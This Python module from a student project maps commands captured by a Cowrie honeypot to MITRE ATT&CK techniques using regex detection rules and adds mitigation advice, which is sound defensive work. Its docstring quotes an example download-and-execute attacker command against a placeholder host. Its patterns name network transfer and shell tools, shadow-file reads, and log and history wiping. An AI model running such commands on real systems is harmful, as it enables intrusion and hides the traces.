#!/usr/bin/env python3
"""
mitre_mapping.py - Clasificacion de la actividad de Cowrie en MITRE ATT&CK
Proyecto Intermodular ASIR - Diego Perez Fonterosa

Cada comando que ejecuta un atacante en el honeypot se compara con un
conjunto de reglas (expresiones regulares). Un comando puede corresponder a
varias tecnicas: "cd /tmp; wget http://x/bot; chmod +x bot; ./bot" es a la
vez descarga de herramientas (T1105), cambio de permisos (T1222.002) y
ejecucion (T1059.004).

Los intentos de autenticacion se clasifican aparte a partir de los eventos
cowrie.login.failed (T1110.001) y cowrie.login.success (T1078.003).

IDs comprobados contra https://attack.mitre.org (ATT&CK v16+).
"""

import re
from collections import Counter, defaultdict

# Orden de las tacticas segun la matriz Enterprise de ATT&CK
ORDEN_TACTICAS = [
    "Initial Access", "Execution", "Persistence", "Privilege Escalation",
    "Defense Evasion", "Credential Access", "Discovery", "Lateral Movement",
    "Collection", "Command and Control", "Exfiltration", "Impact",
]

# (id, nombre, tactica, patron, recomendacion)
REGLAS = [
    # --- Descubrimiento -------------------------------------------------
    ("T1082", "System Information Discovery", "Discovery",
     r"\buname\b|/proc/cpuinfo|/proc/meminfo|\blscpu\b|\bnproc\b|\bfree\b|\bdf\b|"
     r"/etc/(os|lsb)-release|\bhostnamectl\b|\bdmidecode\b|\buptime\b",
     "Detectar con auditd la ejecucion en rafaga de comandos de reconocimiento."),
    ("T1087.001", "Account Discovery: Local Account", "Discovery",
     r"/etc/passwd|/etc/group\b|\blastlog\b|\bgetent\s+passwd",
     "Auditar lecturas de /etc/passwd fuera de procesos del sistema."),
    ("T1033", "System Owner/User Discovery", "Discovery",
     r"\bwhoami\b|(^|[;&|\s])id(\s|$|;)|(^|[;&|\s])w(\s|$|;)|\bwho\b|\blast\b",
     "Correlacionar con el origen de la sesion: es reconocimiento tras el acceso."),
    ("T1057", "Process Discovery", "Discovery",
     r"\bps\b|\btop\b|\bpgrep\b|\bpidof\b",
     "Monitorizar listados de procesos desde sesiones SSH recien abiertas."),
    ("T1016", "System Network Configuration Discovery", "Discovery",
     r"\bifconfig\b|\bip\s+(a|addr|r|route|link)\b|\broute\b|/etc/resolv\.conf|\barp\b",
     "Detectar consultas de configuracion de red desde sesiones interactivas."),
    ("T1049", "System Network Connections Discovery", "Discovery",
     r"\bnetstat\b|(^|[;&|\s])ss\s+-|\blsof\s+-i",
     "Detectar enumeracion de conexiones desde sesiones interactivas."),
    ("T1083", "File and Directory Discovery", "Discovery",
     r"(^|[;&|\s])ls(\s|$)|\bfind\s+/",
     "Monitorizar la exploracion de directorios temporales (/tmp, /dev/shm)."),

    # --- Acceso a credenciales -------------------------------------------
    ("T1003.008", "OS Credential Dumping: /etc/passwd and /etc/shadow", "Credential Access",
     r"/etc/shadow|\bunshadow\b",
     "M1026 Privileged Account Management: impedir el acceso como root; "
     "M1027 Password Policies."),

    # --- Ejecucion y transferencia ---------------------------------------
    ("T1105", "Ingress Tool Transfer", "Command and Control",
     r"\bwget\b|\bcurl\b|\btftp\b|\bftpget\b|\bscp\b|\bnc\b.*<|/dev/tcp/",
     "M1031 Network Intrusion Prevention; M1037 Filter Network Traffic: "
     "filtrar el trafico saliente de los servidores."),
    ("T1140", "Deobfuscate/Decode Files or Information", "Defense Evasion",
     r"base64\s+(-d|--decode)|\bxxd\s+-r|\bopenssl\s+enc\s+-d",
     "Detectar decodificaciones encadenadas a un interprete (base64 -d | sh)."),

    # --- Persistencia ------------------------------------------------------
    ("T1098.004", "Account Manipulation: SSH Authorized Keys", "Persistence",
     r"authorized_keys",
     "M1022 Restrict File and Directory Permissions: proteger authorized_keys "
     "y vigilar sus cambios con un control de integridad (FIM)."),
    ("T1098", "Account Manipulation", "Persistence",
     r"\bchpasswd\b|(^|[;&|\s])passwd(\s|$)|\busermod\b",
     "M1026 Privileged Account Management; M1032 Multi-factor Authentication."),
    ("T1136.001", "Create Account: Local Account", "Persistence",
     r"\buseradd\b|\badduser\b",
     "M1026 Privileged Account Management; alertar ante cuentas nuevas."),
    ("T1053.003", "Scheduled Task/Job: Cron", "Persistence",
     r"crontab\s+-[er]|\|\s*crontab|crontab\s+[^-\s]|/etc/cron|/var/spool/cron",
     "M1018 User Account Management: restringir quien puede usar cron "
     "(/etc/cron.allow)."),

    # --- Evasion de defensas -----------------------------------------------
    ("T1222.002", "File and Directory Permissions Modification: Linux", "Defense Evasion",
     r"\bchmod\b|\bchattr\b|\bchown\b",
     "M1022 Restrict File and Directory Permissions: montar /tmp con noexec."),
    ("T1070.003", "Indicator Removal: Clear Command History", "Defense Evasion",
     r"history\s+-c|unset\s+HISTFILE|HISTFILE=|\.bash_history|HISTSIZE=0",
     "M1029 Remote Data Storage: enviar el historial y los logs a un sistema remoto."),
    ("T1070.002", "Indicator Removal: Clear Linux or Mac System Logs", "Defense Evasion",
     r"/var/log|\bjournalctl\s+--vacuum|\bwtmp\b|\bbtmp\b|\blastlog\b.*>",
     "M1029 Remote Data Storage: centralizar los logs en un SIEM."),
    ("T1562.004", "Impair Defenses: Disable or Modify System Firewall", "Defense Evasion",
     r"iptables\s+-[FX]|\bufw\s+disable|systemctl\s+(stop|disable)\s+(firewalld|ufw)",
     "M1018 User Account Management: limitar quien puede modificar el firewall."),

    # --- Impacto -----------------------------------------------------------
    ("T1496.001", "Resource Hijacking: Compute Hijacking", "Impact",
     r"\bxmrig\b|\bminerd\b|\bcpuminer\b|stratum\+tcp|\bminer\b|\bkdevtmpfsi\b|\bkinsing\b",
     "Sin mitigacion preventiva en ATT&CK: monitorizar el uso de CPU y bloquear "
     "el trafico saliente hacia pools de mineria."),
]

# Toda orden ejecutada en la shell es T1059.004
T1059 = ("T1059.004", "Command and Scripting Interpreter: Unix Shell", "Execution",
         "M1038 Execution Prevention: impedir la ejecucion desde directorios "
         "temporales (/tmp, /dev/shm) montados con noexec.")
T1110 = ("T1110.001", "Brute Force: Password Guessing", "Credential Access",
         "M1032 Multi-factor Authentication; M1036 Account Use Policies; "
         "deshabilitar la autenticacion por contrasena en SSH (solo claves).")
T1078 = ("T1078.003", "Valid Accounts: Local Accounts", "Initial Access",
         "M1027 Password Policies; M1026 Privileged Account Management: "
         "prohibir el acceso remoto como root.")

_COMPILADAS = [(tid, nom, tac, re.compile(pat, re.IGNORECASE), rec)
               for tid, nom, tac, pat, rec in REGLAS]


def clasificar_comando(cmd):
    """Devuelve la lista de (id, nombre, tactica, recomendacion) de un comando."""
    tecnicas = [(tid, nom, tac, rec) for tid, nom, tac, rx, rec in _COMPILADAS if rx.search(cmd)]
    return tecnicas


def mapear(events):
    """Clasifica todos los eventos y devuelve una lista de tecnicas con evidencias.

    Cada elemento: dict con id, nombre, tactica, recomendacion, ejecuciones
    (veces que aparece), sesiones (sesiones distintas), ips (IPs distintas)
    y ejemplos (comandos reales mas frecuentes).
    """
    datos = defaultdict(lambda: {"ejecuciones": 0, "sesiones": set(), "ips": set(),
                                 "ejemplos": Counter()})
    meta = {}
    sin_clasificar = Counter()

    def anotar(tecnica, e, ejemplo):
        tid, nom, tac, rec = tecnica
        meta[tid] = (nom, tac, rec)
        d = datos[tid]
        d["ejecuciones"] += 1
        d["sesiones"].add(e.get("session"))
        d["ips"].add(e.get("src_ip"))
        if ejemplo:
            d["ejemplos"][ejemplo] += 1

    for e in events:
        ev = e.get("eventid")
        if ev == "cowrie.login.failed":
            anotar(T1110, e, f"{e.get('username', '')}:{e.get('password', '')}")
        elif ev == "cowrie.login.success":
            anotar(T1078, e, f"{e.get('username', '')}:{e.get('password', '')}")
        elif ev == "cowrie.command.input":
            cmd = (e.get("input") or "").strip()
            if not cmd:
                continue
            anotar((T1059[0], T1059[1], T1059[2], T1059[3]), e, None)
            tecnicas = clasificar_comando(cmd)
            for t in tecnicas:
                anotar(t, e, cmd)
            if not tecnicas:
                sin_clasificar[cmd] += 1

    resultado = []
    for tid, d in datos.items():
        nom, tac, rec = meta[tid]
        resultado.append({
            "id": tid, "nombre": nom, "tactica": tac, "recomendacion": rec,
            "ejecuciones": d["ejecuciones"], "sesiones": len(d["sesiones"]),
            "ips": len(d["ips"]), "ejemplos": d["ejemplos"].most_common(3),
        })
    resultado.sort(key=lambda t: (ORDEN_TACTICAS.index(t["tactica"]), -t["sesiones"]))
    return resultado, sin_clasificar
